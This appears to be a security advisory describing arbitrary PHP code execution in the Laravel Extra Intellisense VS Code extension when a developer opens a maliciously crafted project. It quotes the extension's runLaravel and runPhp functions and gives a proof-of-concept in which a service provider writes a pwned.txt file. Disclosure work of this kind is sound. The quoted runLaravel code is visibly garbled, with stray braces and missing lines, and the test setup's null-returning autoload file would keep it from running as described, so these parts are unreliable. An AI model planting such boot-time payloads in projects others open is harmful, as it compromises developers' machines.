### Vulnerability List for Laravel Extra Intellisense VS Code Extension

* Vulnerability Name: Arbitrary PHP Code Execution via Malicious Workspace
* Description:
    1. An attacker crafts a malicious Laravel project.
    2. The malicious project contains PHP code designed to be executed when the Laravel application boots. This can be achieved by placing malicious PHP code in locations such as service providers (e.g., `AppServiceProvider.php`), route files (e.g., `routes/web.php`, `routes/api.php`), configuration files (e.g., `config/app.php`), or any other file that is automatically included during Laravel's bootstrap process.
    3. A victim, who is a Laravel developer using VS Code with the "Laravel Extra Intellisense" extension installed, opens this maliciously crafted Laravel project in their VS Code workspace.
    4. Upon opening the project, the "Laravel Extra Intellisense" extension automatically initiates its functionality to gather data for autocompletion features. This involves executing PHP code from the opened project using the `php -r` command via the `Helpers.runLaravel()` function.
    5. Due to the automatic and unsupervised nature of this code execution, the malicious PHP code embedded within the attacker's project is executed within the victim's development environment. This execution takes place in the context of the user's system and VS Code environment.
    6. The consequence is arbitrary code execution, where the attacker's malicious PHP code can perform unintended actions on the victim's machine. This could range from benign actions (like creating a file as a proof of concept) to severe security breaches such as:
        - **Data Exfiltration:** Stealing sensitive files, environment variables, or credentials from the victim's project or system.
        - **Remote Code Execution:** Establishing a reverse shell or other means of persistent remote access to the victim's development machine.
        - **Local Privilege Escalation:** Exploiting system vulnerabilities (if any are accessible from the PHP execution context) to gain higher privileges.
        - **Denial of Service:** Crashing the victim's development environment or system.
        - **Supply Chain Attack:** If the victim commits and pushes code from the compromised project, the malicious code could be propagated to other developers or even production environments.
* Impact: Arbitrary code execution on the developer's machine, potentially leading to sensitive data exfiltration, remote code execution, local privilege escalation, denial of service, or supply chain attacks.
* Vulnerability Rank: Critical
* Currently Implemented Mitigations:
    - Security Note in `README.md`: The extension's documentation includes a "Security Note" that warns users about the extension running their Laravel application automatically and suggests temporarily disabling the extension when writing sensitive code in service providers.
        ```markdown
        ## Security Note
        This extension runs your Laravel application automatically and periodically to get the information needed to provide autocomplete.

        So if you have any unknown errors in your log make sure the extension not causing it.

        Also if you writing any sensitive code in your service providers, disable the extension temporarily to prevent unwanted application executing.
        ```
        **Effectiveness:** This mitigation is purely advisory and relies on the user reading and understanding the security implications, and then manually taking precautions. It does not technically prevent the vulnerability.
* Missing Mitigations:
    - **Sandboxing or Isolation:** Implement a secure sandbox or isolation mechanism for executing PHP code. This would involve running the PHP code in a restricted environment with limited access to system resources and sensitive data. However, this is complex to achieve within a VS Code extension and might impact the functionality that relies on accessing the project.
    - **User Confirmation for Code Execution:** Before executing PHP code from the workspace, the extension could prompt the user for explicit confirmation, especially when a new workspace is opened or when significant changes are detected in project files. This would give users control over when and whether PHP code is executed. However, this might disrupt the seamless autocompletion experience.
    - **Disable Automatic Execution by Default:** Change the default behavior to not automatically execute PHP code upon workspace opening. Instead, provide a setting or command to allow users to explicitly trigger the data loading and PHP execution when they are confident in the project's security. This would shift the security responsibility to the user but significantly reduce the risk of automatic exploitation.
    - **Code Analysis of Project (Complex and Resource Intensive):** Implement static or dynamic analysis of the opened Laravel project to detect potentially malicious code before execution. This is an extremely complex task, especially for PHP, and could introduce significant performance overhead. It might also not be reliably effective in detecting all types of malicious code.
* Preconditions:
    - VS Code is installed.
    - The "Laravel Extra Intellisense" extension is installed and activated in VS Code.
    - A user opens a workspace in VS Code that is a Laravel project.
    - The opened Laravel project is maliciously crafted and contains PHP code intended for malicious purposes.
* Source Code Analysis:
    - `src/helpers.ts`:
        - `runLaravel(code: string, description: string|null = null)` function: This function is the core of the vulnerability. It constructs a PHP command and executes it using `child_process.exec`. The executed PHP code is designed to bootstrap a Laravel application and then execute the provided `$code` within that application context.

        ```typescript
        static runLaravel(code: string, description: string|null = null) : Promise<string> {
            code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
            if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
                var command =
                    "define('LARAVEL_START', microtime(true));" +
                    "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
                    "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +

                    "		}" +
                    "	}" +
                    "}" +
                    "$app->register(new VscodeLaravelExtraIntellisenseProvider($app));" +
                    "$kernel = $app->make(Illuminate\\Contracts\\Console\\Kernel::class);" +

                    "$status = $kernel->handle(" +
                        "$input = new Symfony\\Component\\Console\\Input\\ArgvInput," +

                    ");" +
                    "if ($status == 0) {" +
                    "	echo '___VSCODE_LARAVEL_EXTRA_INSTELLISENSE_OUTPUT___';" +
                        code +

                    "$kernel->terminate($input, $status);" +
                    "exit($status);"

                var self = this;

                return new Promise(function (resolve, error) {
                    self.runPhp(command, description)
                        .then(function (result: string) {
                            var out : string | null | RegExpExecArray = result;
                            out = /___VSCODE_LARAVEL_EXTRA_INSTELLISENSE_OUTPUT___(.*)___VSCODE_LARAVEL_EXTRA_INSTELLISENSE_END_OUTPUT___/g.exec(out);
                            if (out) {
                                resolve(out[1]);
                            } else {
                                error("PARSE ERROR: " + result);

                                Helpers.outputChannel?.error("Laravel Extra Intellisense Parse Error:\n " + (description ?? '') + '\n\n' + result);
                                Helpers.showErrorPopup();
                            }
                        })
                        .catch(function (e : Error) {
                            error(e);
                        });
                });
            }
            return new Promise((resolve, error) => resolve(""));
        }
        ```
        - `runPhp(code: string, description: string|null = null)` function: Executes raw PHP code using `php -r "{code}"`. The `phpCommand` setting from the extension's configuration allows users to modify the PHP execution command, but by default it uses `php -r`.

        ```typescript
        static async runPhp(code: string, description: string|null = null) : Promise<string> {
            code = code.replace(/\"/g, "\\\"");
            if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
                code = code.replace(/\$/g, "\\$");
                code = code.replace(/\\\\'/g, '\\\\\\\\\'');
                code = code.replace(/\\\\"/g, '\\\\\\\\\"');
            }
            let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
            let command = commandTemplate.replace("{code}", code);
            let out = new Promise<string>(function (resolve, error) {
                if (description != null) {
                    Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description);
                }

                cp.exec(command,
                    { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
                    function (err, stdout, stderr) {
                        if (err == null) {
                            if (description != null) {
                                Helpers.outputChannel?.info("Laravel Extra Intellisense Resolved: " + description);
                            }
                            resolve(stdout);
                        } else {
                            const errorOutput = stderr.length > 0 ? stderr : stdout;
                            Helpers.outputChannel?.error("Laravel Extra Intellisense Error:\n " + (description ?? '') + '\n\n' + errorOutput);
                            Helpers.showErrorPopup();
                            error(errorOutput);
                        }
                    }
                );
            });
            return out;
        }
        ```
    - `src/extension.ts` and `src/*Provider.ts`:
        - The `activate()` function in `extension.ts` registers various completion providers (e.g., `RouteProvider`, `ViewProvider`, `ConfigProvider`).
        - These providers, in their `load...()` methods (e.g., `loadRoutes()`, `loadConfigs()`, `loadViews()`), use `Helpers.runLaravel()` to execute PHP code to gather data for autocompletion. This execution happens automatically when a Laravel project is opened and periodically thereafter.

* Security Test Case:
    1. **Setup:**
        - Ensure you have VS Code installed with the "Laravel Extra Intellisense" extension.
        - Create a new directory named `malicious-laravel-project`.
        - Inside `malicious-laravel-project`, initialize a basic Laravel project (you don't need a full installation, just the basic directory structure and essential files). A simple `composer.json` and basic `bootstrap/app.php`, `vendor/autoload.php` and `artisan` file are sufficient to simulate a Laravel environment for the extension to detect.
        - Create `app/Providers/AppServiceProvider.php` with the following malicious code in the `boot()` method:
        ```php
        <?php

        namespace App\Providers;

        use Illuminate\Support\ServiceProvider;

        class AppServiceProvider extends ServiceProvider
        {
            /**
             * Register any application services.
             *
             * @return void
             */
            public function register()
            {
                //
            }

            /**
             * Bootstrap any application services.
             *
             * @return void
             */
            public function boot()
            {
                file_put_contents(base_path('pwned.txt'), 'You have been pwned by Laravel Extra Intellisense extension! Code executed: ' . date('Y-m-d H:i:s'));
            }
        }
        ```
        - Create a dummy `vendor/autoload.php` file that simply returns `null` to satisfy the extension's check:
        ```php
        <?php
        return null;
        ```
        - Create a dummy `bootstrap/app.php` file that returns a new application instance:
        ```php
        <?php
        use Illuminate\Foundation\Application;
        use Illuminate\Foundation\Configuration\Exceptions\Handler;
        use Illuminate\Foundation\Configuration\Http\Kernel;

        return Application::configure(basePath: dirname(__DIR__))
            ->withProviders([
                App\Providers\AppServiceProvider::class,
            ])
            ->withExceptionHandling(function (Handler $handler) {
                $handler->report(function (Throwable $e) {
                    //
                });
            })->create();
        ```
        - Create a dummy `artisan` file to make the extension recognize the directory as a Laravel project:
        ```
        #!/usr/bin/env php
        <?php
        // Placeholder artisan file
        ```
        - Make `artisan` executable: `chmod +x artisan`

    2. **Trigger Vulnerability:**
        - Open VS Code.
        - Open the `malicious-laravel-project` directory as a workspace in VS Code (`File` -> `Open Folder...` and select `malicious-laravel-project`).
        - Wait for a few seconds for the "Laravel Extra Intellisense" extension to initialize and run.

    3. **Verify Exploitation:**
        - Check the `malicious-laravel-project` directory.
        - You should find a new file named `pwned.txt`.
        - Open `pwned.txt`. It should contain the message "You have been pwned by Laravel Extra Intellisense extension! Code executed: YYYY-MM-DD HH:MM:SS" with the current date and time, confirming that the malicious PHP code in `AppServiceProvider.php` was successfully executed by the extension upon opening the workspace.

This test case demonstrates that opening a maliciously crafted Laravel project will lead to the automatic execution of PHP code defined within that project, confirming the Arbitrary PHP Code Execution vulnerability.
